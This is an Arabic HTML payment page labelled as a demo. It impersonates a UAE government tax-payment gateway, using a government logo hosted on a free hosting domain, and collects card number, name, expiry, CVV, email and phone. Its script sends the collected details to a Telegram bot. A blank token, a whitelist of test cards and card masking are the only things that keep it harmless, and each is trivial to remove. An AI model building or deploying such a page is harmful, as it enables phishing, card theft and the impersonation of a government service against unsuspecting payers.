<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>بوابة الدفع - وضع تجريبي (DEMO)</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  :root{--bg:#f3f6f9;--card:#fff;--primary:#0b61c2;--muted:#9aa4b2;font-family:"Inter",Arial,sans-serif}
  html,body{height:100%;background:var(--bg);margin:0;padding:20px;box-sizing:border-box}
  .wrap{max-width:420px;margin:24px auto}
  .panel{background:var(--card);border-radius:14px;padding:22px;box-shadow:0 6px 20px rgba(20,30,50,0.08)}
  .gov-logo{max-width:160px;display:block;margin:0 auto 10px}
  h1{text-align:center;margin:4px 0 10px}
  .icons{display:flex;gap:10px;justify-content:center;margin-bottom:12px;align-items:center}
  .icons img{width:48px;height:auto}
  .note{font-size:13px;color:var(--muted);margin-bottom:12px;padding:10px;border-radius:8px;background:#fbfdff;border:1px solid #eef6ff}
  .field{margin-bottom:12px}
  label{display:block;font-weight:600;margin-bottom:6px}
  input[type="text"], input[type="tel"], input[type="email"], input[type="password"]{
    width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ee;background:#fff;font-size:15px;box-sizing:border-box
  }
  .row{display:flex;gap:10px}
  .row .col{flex:1}
  .btn{display:block;width:100%;padding:14px;background:var(--primary);color:#fff;border-radius:10px;border:0;font-weight:700;cursor:pointer}
  .small{font-size:13px;color:var(--muted);text-align:center;margin-top:10px}
  .success{color:green}.error{color:#c00}
  footer{font-size:12px;color:var(--muted);text-align:center;margin-top:12px}
</style>
</head>
<body>
  <div class="wrap">
    <div class="panel">
      <img class="gov-logo" src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار">
      <h1>بوابة الدفع الآمن - وضع تجريبي</h1>

      <div class="icons" aria-hidden="true">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Amex_logo.png" alt="amex">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="mc">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="visa">
      </div>

      <p id="amountInfo" class="note">المبلغ: <strong id="amountText">—</strong></p>

      <form id="paymentForm" autocomplete="off" novalidate>
        <div class="field">
          <label>رقم البطاقة</label>
          <input id="cardNumber" type="text" inputmode="numeric" placeholder="4242 4242 4242 4242" maxlength="19">
        </div>

        <div class="field">
          <label>الاسم على البطاقة</label>
          <input id="cardName" type="text" placeholder="الاسم الكامل كما يظهر على البطاقة">
        </div>

        <div class="row">
          <div class="col field">
            <label>تاريخ الانتهاء (MM / YY)</label>
            <input id="exp" type="text" placeholder="MM/YY" maxlength="5">
          </div>
          <div class="col field">
            <label>رمز الأمان (CVV)</label>
            <input id="cvv" type="password" placeholder="***" maxlength="4">
          </div>
        </div>

        <div class="field">
          <label>البريد الإلكتروني</label>
          <input id="email" type="email" placeholder="example@mail.com">
        </div>

        <div class="field">
          <label>رقم الجوال</label>
          <input id="phone" type="tel" placeholder="+9715XXXXXXXX">
        </div>

        <button id="payBtn" class="btn" type="submit">إتمام الدفع</button>

        <p id="status" class="small" aria-live="polite"></p>
      </form>

      <footer>وضع اختبار تجريبي — لا يُستخدم للدفع الحقيقي</footer>
    </div>
  </div>

<script>
const stored = sessionStorage.getItem('taxPaymentData');
if(stored){
  try{
    const data = JSON.parse(stored);
    document.getElementById('amountText').textContent = data.amount || '—';
    if(data.fullName) document.getElementById('cardName').value = data.fullName;
    if(data.email) document.getElementById('email').value = data.email;
    if(data.phone) document.getElementById('phone').value = data.phone;
  }catch(err){console.warn('خطأ في قراءة بيانات الجلسة:', err);}
} else {
  document.getElementById('amountText').textContent = '10 AED';
}

const TELEGRAM_TOKEN = "";  
const TELEGRAM_CHAT_ID = ""; 

const allowedTestCards = ["4242424242424242","4000056655665556"];
function normalizeCardNumber(input){ return input.replace(/\D/g,''); }
function maskCard(cardNum){ const last4 = cardNum.slice(-4); return "**** **** **** " + last4; }

document.getElementById('paymentForm').addEventListener('submit', async function(e){
  e.preventDefault();
  const rawCard = normalizeCardNumber(document.getElementById('cardNumber').value || "");
  const name = (document.getElementById('cardName').value || "").trim();
  const exp = (document.getElementById('exp').value || "").trim();
  const cvv = (document.getElementById('cvv').value || "").trim();
  const email = (document.getElementById('email').value || "").trim();
  const phone = (document.getElementById('phone').value || "").trim();
  const status = document.getElementById('status');
  status.textContent = "";

  if(!name || !exp){
    status.textContent = "❗ الرجاء ملء الحقول المطلوبة (الاسم، تاريخ الانتهاء).";
    status.className = "small error";
    return;
  }

  if(!allowedTestCards.includes(rawCard)){
    status.innerHTML = "⚠️ يُسمح بأرقام بطاقات الاختبار فقط. استخدم: <code>4242 4242 4242 4242</code>";
    status.className = "small error";
    return;
  }

  const last4 = rawCard.slice(-4);
  const masked = maskCard(rawCard);
  const amount = document.getElementById('amountText').textContent;
  const message = [
    "🔔 Demo Payment Attempt",
    `الاسم: ${name}`,
    `المبلغ: ${amount}`,
    `البريد: ${email || '—'}`,
    `الجوال: ${phone || '—'}`,
    `البطاقة: ${masked}`,
    `آخر4: ${last4}`,
    `تاريخ الإنتهاء: ${exp}`,
    `(DEMO - لا تُرسل معلومات حساسة كاملة)`
  ].join("\n");

  status.textContent = "⏳ جارٍ الإرسال..."; status.className = "small";

  if(!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID){
    status.innerHTML = "✅ نجاح تجريبي: لم يتم إرسال شيء لأن التوكن/Chat ID غير مهيأ.<br><pre style='background:#fbfbfb;padding:8px;border-radius:6px;'>"
      + escapeHtml(message) + "</pre>";
    status.className="small success";
    document.getElementById('cardNumber').value = "";
    document.getElementById('cvv').value = "";
    return;
  }

  try{
    const resp = await fetch(`https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_TOKEN)}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    });
    if(resp.ok){
      status.textContent = "✅ تم الإرسال بنجاح (ملخص DEMO أُرسل إلى البوت).";
      status.className = "small success";
      document.getElementById('cardNumber').value = "";
      document.getElementById('cvv').value = "";
    } else {
      const txt = await resp.text();
      status.innerHTML = "⚠️ فشل في إرسال الرسالة إلى بوت التيليجرام.";
      status.className="small error";
      console.error('Telegram error', resp.status, txt);
    }
  }catch(err){
    status.textContent = "❌ حدث خطأ أثناء الإرسال.";
    status.className="small error";
    console.error(err);
  }
});

function escapeHtml(str){ return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
</script>
</body>
</html>
